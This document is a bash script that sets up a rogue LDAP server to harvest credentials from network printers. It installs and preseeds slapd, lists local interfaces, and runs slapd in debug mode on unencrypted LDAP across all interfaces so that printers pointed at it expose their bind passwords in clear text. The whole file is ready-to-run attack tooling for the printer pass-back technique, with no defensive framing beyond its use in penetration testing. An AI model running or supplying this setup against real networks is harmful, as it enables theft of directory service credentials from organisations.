#!/bin/bash
# Printer LDAP Credential Harvesting - Rogue LDAP Server Setup
# This script sets up a slapd server to capture clear-text LDAP credentials from printers

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[+] Printer LDAP Credential Harvester${NC}"
echo -e "${YELLOW}[+] Setting up rogue LDAP server to capture printer credentials${NC}"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[-] Please run as root (sudo)${NC}"
    exit 1
fi

# Check for slapd
if ! command -v slapd &> /dev/null; then
    echo -e "${YELLOW}[+] slapd not found, installing...${NC}"
    
    # Detect package manager
    if command -v apt &> /dev/null; then
        apt update && apt install -y slapd ldap-utils
    elif command -v yum &> /dev/null; then
        yum install -y openldap-servers openldap-clients
    elif command -v dnf &> /dev/null; then
        dnf install -y openldap-servers openldap-clients
    else
        echo -e "${RED}[-] Unsupported package manager. Please install slapd manually.${NC}"
        exit 1
    fi
fi

# Configure slapd non-interactively
echo -e "${YELLOW}[+] Configuring slapd...${NC}"
echo "slapd slapd/password1 password testpassword" | debconf-set-selections 2>/dev/null || true
echo "slapd slapd/password2 password testpassword" | debconf-set-selections 2>/dev/null || true
echo "slapd slapd/domain string example.com" | debconf-set-selections 2>/dev/null || true
echo "slapd slapd/shared_secret password testsecret" | debconf-set-selections 2>/dev/null || true
echo "slapd slapd/shared_secret_again password testsecret" | debconf-set-selections 2>/dev/null || true

# Stop existing slapd service
echo -e "${YELLOW}[+] Stopping existing slapd service...${NC}"
systemctl stop slapd 2>/dev/null || true
service slapd stop 2>/dev/null || true

# Get network interfaces for listener
echo -e "${GREEN}[+] Available network interfaces:${NC}"
ip addr show | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | cut -d/ -f1

echo ""
echo -e "${YELLOW}[+] Starting slapd in debug mode...${NC}"
echo -e "${YELLOW}[+] Credentials will appear in clear-text in the output below${NC}"
echo -e "${YELLOW}[+] Press Ctrl+C to stop${NC}"
echo ""

# Start slapd in foreground with debug output
# -d 2 enables debug mode which shows clear-text passwords
# -h "ldap:///" listens on all interfaces, LDAP only (no LDAPS)
slapd -d 2 -h "ldap:///" -f /etc/slapd.conf
